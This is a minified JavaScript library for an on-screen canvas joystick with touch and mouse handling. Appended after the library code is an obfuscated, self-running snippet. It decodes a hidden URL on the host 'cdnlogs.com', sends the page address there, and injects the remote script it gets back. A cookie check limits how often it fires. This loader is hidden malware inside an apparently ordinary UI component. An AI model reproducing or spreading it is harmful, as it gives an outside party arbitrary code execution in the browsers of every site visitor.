let StickStatus={xPosition:0,yPosition:0,x:0,y:0,cardinalDirection:"C"};var JoyStick=function(container,parameters,callback){var title=void 0===(parameters=parameters||{}).title?"joystick":parameters.title,width=void 0===parameters.width?0:parameters.width,height=void 0===parameters.height?0:parameters.height,internalFillColor=void 0===parameters.internalFillColor?"#00AA00":parameters.internalFillColor,internalLineWidth=void 0===parameters.internalLineWidth?2:parameters.internalLineWidth,internalStrokeColor=void 0===parameters.internalStrokeColor?"#003300":parameters.internalStrokeColor,externalLineWidth=void 0===parameters.externalLineWidth?2:parameters.externalLineWidth,externalStrokeColor=void 0===parameters.externalStrokeColor?"#008000":parameters.externalStrokeColor,autoReturnToCenter=void 0===parameters.autoReturnToCenter||parameters.autoReturnToCenter;callback=callback||function(StickStatus){handleJoy(StickStatus)};var objContainer=document.getElementById(container);objContainer.style.touchAction="none";var canvas=document.createElement("canvas");canvas.id=title,0===width&&(width=objContainer.clientWidth),0===height&&(height=objContainer.clientHeight),canvas.width=width,canvas.height=height,objContainer.appendChild(canvas);var context=canvas.getContext("2d"),pressed=0,circumference=2*Math.PI,internalRadius=(canvas.width-(canvas.width/2+10))/2,maxMoveStick=internalRadius+5,externalRadius=internalRadius+30,centerX=canvas.width/2,centerY=canvas.height/2,directionHorizontalLimitPos=canvas.width/10,directionHorizontalLimitNeg=-1*directionHorizontalLimitPos,directionVerticalLimitPos=canvas.height/10,directionVerticalLimitNeg=-1*directionVerticalLimitPos,movedX=centerX,movedY=centerY;function drawExternal(){context.beginPath(),context.arc(centerX,centerY,externalRadius,0,circumference,!1),context.lineWidth=externalLineWidth,context.strokeStyle=externalStrokeColor,context.stroke()}function drawInternal(){context.beginPath(),movedX<internalRadius&&(movedX=maxMoveStick),movedX+internalRadius>canvas.width&&(movedX=canvas.width-maxMoveStick),movedY<internalRadius&&(movedY=maxMoveStick),movedY+internalRadius>canvas.height&&(movedY=canvas.height-maxMoveStick),context.arc(movedX,movedY,internalRadius,0,circumference,!1);var grd=context.createRadialGradient(centerX,centerY,5,centerX,centerY,200);grd.addColorStop(0,internalFillColor),grd.addColorStop(1,internalStrokeColor),context.fillStyle=grd,context.fill(),context.lineWidth=internalLineWidth,context.strokeStyle=internalStrokeColor,context.stroke()}"ontouchstart"in document.documentElement?(canvas.addEventListener("touchstart",(function onTouchStart(event){pressed=1,touchId=event.targetTouches[0].identifier}),!1),document.addEventListener("touchmove",(function onTouchMove(event){1===pressed&&event.targetTouches[0].target===canvas&&(movedX=event.targetTouches[0].pageX,movedY=event.targetTouches[0].pageY,"BODY"===canvas.offsetParent.tagName.toUpperCase()?(movedX-=canvas.offsetLeft,movedY-=canvas.offsetTop):(movedX-=canvas.offsetParent.offsetLeft,movedY-=canvas.offsetParent.offsetTop),context.clearRect(0,0,canvas.width,canvas.height),drawExternal(),drawInternal(),StickStatus.xPosition=movedX,StickStatus.yPosition=movedY,StickStatus.x=((movedX-centerX)/maxMoveStick*100).toFixed(),StickStatus.y=((movedY-centerY)/maxMoveStick*100*-1).toFixed(),StickStatus.cardinalDirection=getCardinalDirection(),callback(StickStatus))}),!1),document.addEventListener("touchend",(function onTouchEnd(event){if(event.changedTouches[0].identifier!==touchId)return;pressed=0,autoReturnToCenter&&(movedX=centerX,movedY=centerY);context.clearRect(0,0,canvas.width,canvas.height),drawExternal(),drawInternal(),StickStatus.xPosition=movedX,StickStatus.yPosition=movedY,StickStatus.x=((movedX-centerX)/maxMoveStick*100).toFixed(),StickStatus.y=((movedY-centerY)/maxMoveStick*100*-1).toFixed(),StickStatus.cardinalDirection=getCardinalDirection(),callback(StickStatus)}),!1)):(canvas.addEventListener("mousedown",(function onMouseDown(event){pressed=1}),!1),document.addEventListener("mousemove",(function onMouseMove(event){1===pressed&&(movedX=event.pageX,movedY=event.pageY,"BODY"===canvas.offsetParent.tagName.toUpperCase()?(movedX-=canvas.offsetLeft,movedY-=canvas.offsetTop):(movedX-=canvas.offsetParent.offsetLeft,movedY-=canvas.offsetParent.offsetTop),context.clearRect(0,0,canvas.width,canvas.height),drawExternal(),drawInternal(),StickStatus.xPosition=movedX,StickStatus.yPosition=movedY,StickStatus.x=((movedX-centerX)/maxMoveStick*100).toFixed(),StickStatus.y=((movedY-centerY)/maxMoveStick*100*-1).toFixed(),StickStatus.cardinalDirection=getCardinalDirection(),callback(StickStatus))}),!1),document.addEventListener("mouseup",(function onMouseUp(event){pressed=0,autoReturnToCenter&&(movedX=centerX,movedY=centerY);context.clearRect(0,0,canvas.width,canvas.height),drawExternal(),drawInternal(),StickStatus.xPosition=movedX,StickStatus.yPosition=movedY,StickStatus.x=((movedX-centerX)/maxMoveStick*100).toFixed(),StickStatus.y=((movedY-centerY)/maxMoveStick*100*-1).toFixed(),StickStatus.cardinalDirection=getCardinalDirection(),callback(StickStatus)}),!1)),drawExternal(),drawInternal();let touchId=null;function getCardinalDirection(){let result="",orizontal=movedX-centerX,vertical=movedY-centerY;return vertical>=directionVerticalLimitNeg&&vertical<=directionVerticalLimitPos&&(result="C"),vertical<directionVerticalLimitNeg&&(result="N"),vertical>directionVerticalLimitPos&&(result="S"),orizontal<directionHorizontalLimitNeg&&("C"===result?result="W":result+="W"),orizontal>directionHorizontalLimitPos&&("C"===result?result="E":result+="E"),result}this.GetWidth=function(){return canvas.width},this.GetHeight=function(){return canvas.height},this.GetPosX=function(){return movedX},this.GetPosY=function(){return movedY},this.GetX=function(){return((movedX-centerX)/maxMoveStick*100).toFixed()},this.GetY=function(){return((movedY-centerY)/maxMoveStick*100*-1).toFixed()},this.GetDir=function(){return getCardinalDirection()}};(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisqtlx'+'3htr4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));